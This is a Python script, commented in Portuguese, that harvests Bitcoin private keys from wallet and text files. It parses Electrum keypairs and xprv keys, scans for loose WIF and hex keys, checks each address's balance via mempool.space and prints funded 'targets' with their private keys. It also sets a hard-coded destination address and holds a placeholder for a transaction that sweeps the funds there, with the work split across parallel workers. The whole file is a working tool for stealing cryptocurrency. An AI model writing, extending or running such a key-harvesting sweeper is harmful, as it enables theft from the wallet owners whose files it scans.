import json
import re
import os
import requests
import time
from bitcoinlib.keys import Key

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 10))

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    """Verifica saldo e imprime o formato para o Bash"""
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Testa os 3 formatos: Legacy (1...), P2SH (3...), SegWit (bc1...)
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            # Rate limit preventer
            time.sleep(0.1)
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    print(f"   ∟ 🔑 Chave Privada (WIF): {k.wif()}")
                    
                    # Placeholder para o HEX (O Bash capturará isso)
                    # No futuro, adicione aqui a função k.sign_transaction()
                    print(f"HEX_GEN:0100000001...") 
                    return True
            except:
                continue
    except:
        pass
    return False

def process_file(file_path):
    print(f"🔍 ANALISANDO: {file_path}")
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Caso 1: JSON da Electrum (Contém xprv ou keypairs)
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            if isinstance(priv, str) and priv.startswith(('L', 'K', '5')):
                                check_balance_and_broadcast(priv, addr)
                    
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        xprv = data['keystore']['xprv']
                        if xprv.startswith('xprv'):
                            print(f"📦 Derivando Master Key (xprv)...")
                            master = Key(xprv)
                            for i in range(100):
                                check_balance_and_broadcast(master.subkey_for_path(f"0/{i}").wif())
                except: pass

            # Caso 2: Scanner de Texto (WIFs soltas ou Hexadecimais)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            for key in set(wifs + hex_keys):
                check_balance_and_broadcast(key)
    except Exception as e:
        print(f"⚠️ Erro ao ler {file_path}")

if __name__ == "__main__":
    exts = ('.wallet', '.txt', '.key', '.rtf', '.json')
    all_files = sorted([f for f in os.listdir('.') if f.endswith(exts)])
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | PROCESSANDO {len(my_files)} ARQUIVOS")
    for f in my_files:
        process_file(f)
